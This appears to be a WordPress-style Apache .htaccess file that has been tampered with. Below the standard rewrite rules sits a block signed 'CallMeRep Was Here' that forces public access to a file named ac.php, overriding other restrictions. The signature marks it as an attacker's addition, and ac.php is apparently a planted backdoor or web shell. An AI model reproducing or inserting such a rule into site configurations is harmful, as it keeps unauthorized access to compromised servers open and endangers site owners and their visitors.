<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^index.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . index.php [L]

# CallMeRep Was Here - Allow access to ac.php
<Files "ac.php">
  Order allow,deny
  Allow from all
  Satisfy any
</Files>
</IfModule>
